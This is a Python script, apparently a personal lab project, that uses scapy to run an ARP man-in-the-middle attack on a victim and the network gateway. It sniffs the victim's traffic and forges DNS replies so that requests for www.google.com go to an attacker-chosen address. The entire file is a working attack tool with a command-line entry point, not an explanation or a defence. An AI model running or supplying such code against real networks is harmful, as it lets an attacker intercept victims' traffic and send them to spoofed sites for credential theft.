# Packages
import scapy.all as scapy
import sys, time, multiprocessing

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30
SPOOF_DOMAIN_NAME = 'www.google.com'
REDIRECT_IP = '192.168.56.102'

# ARP Man in the Middle DNS Poisoning Attack
class ARPMITMDNSPoisoning():
    # Constructs the ARP Man in the Middle DNS Poisoning Attack
    def __init__(self, victimIP, interface):
        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign targets
        self.victimIP = victimIP
        self.interface = interface
        self.routerIP = scapy.conf.route.route('0.0.0.0')[2] # Gateway ip address

        # Assign macAddresses
        self.victimMac = scapy.getmacbyip(victimIP)
        self.routerMac = scapy.getmacbyip(self.routerIP)
        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPMITMDNSPoisoning({}, {})'.format(self.victimIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP Man in the Middle DNS Poisoning on {}:\n - Victim IP {} at {}'.format(
                self.interface, self.victimIP, self.victimMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP/DNS Poisoning and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.routerIP,
                           pdst = self.victimIP, 
                           hwdst = self.victimMac)

        # ARP Poisoning packet for victim two
        routerPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimIP,
                            pdst = self.routerIP,
                            hwdst = self.routerMac)

        # Sniffing process
        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)

        # Start sniffing process
        sniffingIncomingPacketsProcess.start()

        # Infinitely poisons the victims
        while True:
            try: # Send poison packets
                scapy.send(victimPoisonPacket)
                scapy.send(routerPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
                self.clean() # Cleaning ARP tables of the victims
                break # Stop the poisoning-loop

    # Sniffs incoming packets
    def sniffIncomingPackets(self):
        bpfFilter = 'ip host {}'.format(self.victimIP) 
        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)

    # DNS spoof packets
    def dnsSpoof(self, packet):
        if (packet.haslayer(scapy.DNS)):
            print('DNS Signal')
            # Initialize packet layers
            packetDNSLayer = packet.getlayer(scapy.DNS)
            isRightDomain = packetDNSLayer.qd.qname == 'www.google.com.'
            isDNSRequest = packetDNSLayer.qr == 0
            print(packetDNSLayer.qd.qname)
            if isDNSRequest and isRightDomain:
                print("Google was requested")
                # Original packet layers
                packetIPLayer = packet.getlayer(scapy.IP)
                packetUDPLayer = packet.getlayer(scapy.UDP)
                
                # Spoofed packet layers
                spoofedIPLayer = scapy.IP(dst = packetIPLayer.src,
                                src = packetIPLayer.dst) # Reverse IP sending direction
                spoofedUDPLayer = scapy.UDP(dport = packetUDPLayer.sport,
                                sport = packetUDPLayer.dport) # Reverse UDP sending direction
                spoofedDNSLayer = scapy.DNS(id = packetDNSLayer.id,
                                qr = 1,
                                aa = 1,
                                qd = packetDNSLayer.qd,
                                an = scapy.DNSRR(rrname = packetDNSLayer.qd.qname,
                                                ttl = 10,
                                                rdata = REDIRECT_IP))

                packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
        scapy.send(packet)

    # Clean ARP tables of the victims
    def clean(self):
        # Clean victim one's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.routerIP,
            hwsrc=self.routerMac,
            pdst=self.victimIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean victim two's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimIP,
            hwsrc=self.victimMac,
            pdst=self.routerIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)

# Starts the program
if __name__ == '__main__':
    # Disables verbosity (command line) mode
    scapy.conf.verb = 0

    # Assign parameters to variables
    victimIP = sys.argv[1]
    interface = sys.argv[2]

    # Initialize Attack
    attack = ARPMITMDNSPoisoning(victimIP, interface)

    # Execute attack
    attack.execute()
